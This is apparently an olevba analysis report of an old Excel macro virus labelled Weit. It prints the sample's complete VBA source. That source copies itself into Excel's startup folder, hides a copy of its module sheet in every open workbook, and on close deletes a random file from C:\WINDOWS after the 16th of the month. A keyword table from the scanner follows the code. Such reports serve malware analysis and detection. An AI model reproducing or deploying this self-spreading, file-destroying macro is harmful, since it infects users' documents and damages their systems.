olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Weit-46d2a7971acdbf6dfe36bf4155463fb600fd1a51
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EXCELLS.bas 
in file: Virus.MSExcel.Weit-46d2a7971acdbf6dfe36bf4155463fb600fd1a51 - OLE stream: '_VBA_PROJECT_CUR/VBA/EXCELLS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 







Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim startpfad As String

    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    startpfad = Application.StartupPath
    If Right$(startpfad, 1) = "\" Then
        startpfad = startpfad + "_X_X_X_X.XLS"
    Else
        startpfad = startpfad + "\_X_X_X_X.XLS"
    End If
    If chk_first_time(startpfad) Then
        ActiveWorkbook.SaveCopyAs (startpfad)
    Else
        Close #1
    End If
    If Workbooks.Count <= 1 Then
        Workbooks.Add
    End If
    For Each w In Workbooks
        If w.Name <> ThisWorkbook.Name Then
            If Workbooks(w.Name).Sheets(1).Name <> "EXCELLS" Then
                ThisWorkbook.Sheets("EXCELLS").Copy before:=Workbooks(w.Name).Sheets(1)
                Workbooks(w.Name).Sheets("EXCELLS").Visible = False
                Application.OnSheetDeactivate = ActiveWorkbook.Name & "!EXCELLS.weitergehts"
            End If
        End If
    Next w
    Application.ScreenUpdating = True
    If ThisWorkbook.Name = "_X_X_X_X.XLS" Then
        ThisWorkbook.Close
    Else
        ThisWorkbook.Activate
    End If
End Sub

Sub auto_close()
Attribute auto_close.VB_ProcData.VB_Invoke_Func = " \n14"
Dim datei As String
Dim x As Integer
Dim y As Integer
    On Error Resume Next
    Randomize
    datei = Dir$("C:\WINDOWS\*.*")
    y = (Rnd * 100) Mod 3
    For x = 1 To y
        datei = Dir$()
    Next
    If Day(Date) > 16 Then
        Kill "C:\WINDOWS\" + datei
    End If
End Sub

Function chk_first_time(datei As String) As Integer
Attribute chk_first_time.VB_ProcData.VB_Invoke_Func = " \n14"
    chk_first_time = False
    On Error GoTo fehler
    Open (datei) For Input As 1
    On Error Resume Next
    Exit Function
fehler:
    chk_first_time = True
    Resume Next
End Function

Sub weitergehts()
Attribute weitergehts.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.ScreenUpdating = False
    Application.DisplayAlerts = False
    On Error Resume Next
    For Each w In Workbooks
        If w.Name <> ThisWorkbook.Name Then
            If Workbooks(w.Name).Sheets(1).Name <> "EXCELLS" Then
                ThisWorkbook.Sheets("EXCELLS").Copy before:=Workbooks(w.Name).Sheets(1)
                Workbooks(w.Name).Sheets("EXCELLS").Visible = False
                Application.OnSheetDeactivate = ""
            End If
        End If
    Next w
    Application.ScreenUpdating = True
End Sub


-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  EXCELL
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|AutoExec  |auto_close          |Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

